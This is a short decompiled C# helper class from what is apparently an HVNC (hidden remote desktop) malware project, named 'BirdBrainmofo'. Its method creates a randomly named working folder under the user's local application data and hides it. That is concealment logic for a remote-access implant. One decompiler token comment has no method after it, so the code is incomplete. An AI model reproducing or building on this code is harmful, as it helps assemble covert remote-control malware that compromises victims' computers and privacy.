using System;
using System.IO;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000DC RID: 220
	public sealed class Paths
	{
		// Token: 0x060008D7 RID: 2263 RVA: 0x00060728 File Offset: 0x0005E928
		public static string InitWorkDir()
		{
			string text = Path.Combine(Lappdata, StringsCrypt.GenerateRandomData(Config.Mutex));
			string text2;
			if (Directory.Exists(text))
			{
				text2 = text;
			}
			else
			{
				Directory.CreateDirectory(text);
				Startup.HideFile(text);
				text2 = text;
			}
			return text2;
		}

		// Token: 0x060008D8 RID: 2264 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x060008D9 RID: 2265 RVA: 0x0000AC6D File Offset: 0x00008E6D
		// Note: this type is marked as 'beforefieldinit'.
		static Paths()
		{
		}

		// Token: 0x0400072C RID: 1836
		public static string Appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0400072D RID: 1837
		public static string Lappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
	}
}
